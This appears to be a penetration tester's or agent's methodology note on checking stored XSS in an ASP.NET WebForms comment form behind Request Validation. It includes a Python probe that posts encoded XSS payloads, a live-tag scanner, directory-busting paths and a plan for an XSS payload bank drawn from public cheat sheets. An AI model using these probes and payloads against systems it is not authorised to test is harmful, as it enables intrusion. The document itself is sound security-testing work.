# ASP.NET WebForms + Request Validation — Exhaustive Non-Exploitability Proof

## The mechanic (non-obvious, root of most false positives)
Legacy ASP.NET WebForms (`.aspx`) apps often render user comment text with **no HTML
output encoding** — e.g. `<span id="Repeater1_Label3_1">USERINPUT</span>` shows the raw
submission. This *looks* XSS-able. But ASP.NET **Request Validation** (`validateRequest`,
enabled by default on 4.x) is a hard gate at submission time:

- Any literal `<` or `>` in **any** POST field → HTTP 500
  (`A potentially dangerous Request.Form value was detected`). This blocks **all** raw
  tags — `<script>`, `<h1>`, `<img onerror>`, `<svg>`, and attribute breakouts — not just
  `<script>`.
- Only **encoded** forms slip through and return 200:
  - URL: `%3C` / `%3E`, double/triple URL-encoding
  - HTML entity: `&lt;` / `&gt;` (named, hex `&#x3c;`, decimal `&#60;`)
  - JS unicode: `\u003c` / `\u003e`, octal `\152\141...`
  - UTF-7: `+ADw-` / `+AD4-`
  - Overlong UTF-8: `%C0%BC`, `%E0%80%BC`, `%F0%80%80%BC`
  - These get **stored**.
- **Critical:** the server stores the encoded string **verbatim** — there is NO decode step
  on save or on render. The sink emits `&lt;script&gt;` as literal text; the browser never
  parses a live tag. So *bypassing validation ≠ achieving XSS*. A filter you can bypass is
  not the same as a missing decode you can force.

## Definitive proof methodology
1. **POST a matrix of encodings** (raw, HTML-entity, URL single/double/triple, JS-unicode,
   UTF-7, overlong, octal) to the form; record 200 vs 500 per encoding.
2. **Re-GET the comment page** across all paginated pages (POST with
   `__EVENTTARGET=rptPaging$ctlNN$btnPage`) and inspect the sink for a **REAL** tag.
   - Strict live-tag check: a `<` followed by a tag name (`script|img|svg|body|iframe|
     details|math|style|object|embed|video|audio`) that is **NOT** prefixed by `&lt;`,
     `%3C`, `\u`, or `\x`. Only that is "executable."
3. **DETECTOR FALSE POSITIVE — the trap I hit:** a verification script that greps the
   rendered sink for the substrings `alert`, `onerror`, `onload`, `javascript:`, or
   `<script` will **flag inert strings as "executable"**, e.g.:
   - `[a](javascript:window.onerror=alert;throw%201)` (markdown link, no real tag)
   - octal JS `\152\141\166\141\163\143\162\151\160\164\072alert(1)` (literal text)
   - a code snippet `var contentType = 1; alert(1);`
   None contain a parseable tag. Require the REAL `<tag>` form above before claiming
   execution. My first scanner run printed "EXPLOITABLE" with 8 hits from exactly this bug;
   a strict re-scan returned 0. Correct the detector, never the verdict.
4. If 0 real tags across **all** encodings + all pages → **NOT exploitable via this form**.
5. **Secondary-sink dir-bust** (the only real path): legacy WebForms apps often have a
   hidden admin/export/API page rendering the same store *without* validation. Brute:
   `/admin.aspx`, `/viewcomments.aspx`, `/comments.aspx`, `/api/comment`, `*.asmx`,
   `*.ashx`, `/trace.axd`. If dir-bust is clean (only the public form + maybe
   `/trace.axd` 403), there is no second path and the finding is informational only.
6. `/trace.axd` → **403** = ASP.NET tracing enabled (info-disclosure finding if ever
   reachable). Log separately; it is NOT XSS.

## Reusable Python probe skeleton (urllib, no deps)
```python
import urllib.request, urllib.parse, re

BASE = "http://TARGET/add_comment1.aspx"
H = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}

def get():
    with urllib.request.urlopen(urllib.request.Request(BASE, headers=H), timeout=20) as r:
        return r.read().decode("utf-8", "replace")

def fields(src):
    vs = re.search(r'name="__VIEWSTATE"[^>]*?value="([^"]*)"', src)
    ev = re.search(r'name="__EVENTVALIDATION"[^>]*?value="([^"]*)"', src)
    vg = re.search(r'name="__VIEWSTATEGENERATOR"[^>]*?value="([^"]*)"', src)
    return (urllib.parse.unquote(vs.group(1)) if vs else "",
            urllib.parse.unquote(ev.group(1)) if ev else "",
            urllib.parse.unquote(vg.group(1)) if vg else "4D0FA771")

def post(vs, ev, vg, comment):
    data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":vs,
            "__VIEWSTATEGENERATOR":vg,"__EVENTVALIDATION":ev,
            "txtName":"test","txtEmail":"[REDACTED_EMAIL]","btn_Submit":"Submit",
            "txtComment":comment}
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(BASE, data=body, headers=H)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")

def sink_labels(html):
    return re.findall(r'id="Repeater1_Label3_\d+"[^>]*>(.*?)</span>', html, re.S)

# 1) encode matrix
for enc, payload in [("raw","<script>alert(1)</script>"),
                     ("html","&lt;script&gt;alert(1)&lt;/script&gt;"),
                     ("url","%3Cscript%3Ealert(1)%3C/script%3E"),
                     ("jsuni","\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"),
                     ("utf7","+ADw-script+AD4-alert(1)+ADw-/script+AD4-"),
                     ("overlong","%C0%BCscript%3Ealert(1)%C0%BC")]:
    s, _ = post(*fields(get()), payload)
    print(enc, "->", "BLOCKED(500)" if s==500 else "ACCEPTED(200)")

# 2) strict live-tag scan across all pages
html = get(); vs,ev,vg = fields(html)
pages = sorted(set(re.findall(r'rptPaging\$ctl(\d\d)\$btnPage', html)), key=lambda x:int(x))
live = 0
for idx in pages:
    d = {"__EVENTTARGET":f"rptPaging$ctl{idx}$btnPage","__EVENTARGUMENT":"",
         "__VIEWSTATE":vs,"__VIEWSTATEGENERATOR":vg,"__EVENTVALIDATION":ev,
         "txtName":"test","txtEmail":"[REDACTED_EMAIL]","btn_Submit":"Submit","txtComment":"x"}
    body = urllib.parse.urlencode(d).encode()
    req = urllib.request.Request(BASE, data=body, headers=H)
    try:
        with urllib.request.urlopen(req, timeout=20) as r: pg = r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: pg = e.read().decode("utf-8","replace")
    for l in sink_labels(pg):
        st = l.lstrip()
        if st.startswith(("&lt;","%3C","\\u","\\x")): continue
        if re.search(r'<(script|img|svg|iframe|body|style|math|object|embed|details|video|audio)[ >/\s]', l, re.I):
            live += 1
print("LIVE executable tags found:", live, "-> VERDICT:", "EXPLOITABLE" if live else "NOT EXPLOITABLE")
```

## Arsenal collection (portable XSS payload bank)
For building a reusable payload set (most fire on *properly* vulnerable apps, just not on a
Request-Validation-gated WebForms sink):
- PortSwigger cheat sheet: `curl` `https://portswigger.net/web-security/cross-site-scripting/cheat-sheet`
  (embeds the full payload DB) + `https://portswigger.net/sitemap.xml` (full lab taxonomy:
  reflected/stored/DOM/contexts/CSP/exploiting).
- GitHub: `PayloadsAllTheThings/XSS-injection`, `payloadbox/xss-payload-list`,
  OWASP `xss-filter-evasion-cheatsheet`.
- Parse out payload tokens, categorize by context (HTML-tag / attribute-breakout / JS-context
  / URL-uri / encoded / event-handler / DOM), store as a file for future targets.

## Legacy WebForms tell
Client-side validator script using `document.all ? document.all[...] : document.getElementById(...)`
fallback = legacy ASP.NET (2.0/3.5 or xhtmlConformance=Legacy on 4.x). Confirms old stack;
validators are client-side only (bypassable by direct POST) — the real gate is server-side
`validateRequest`.
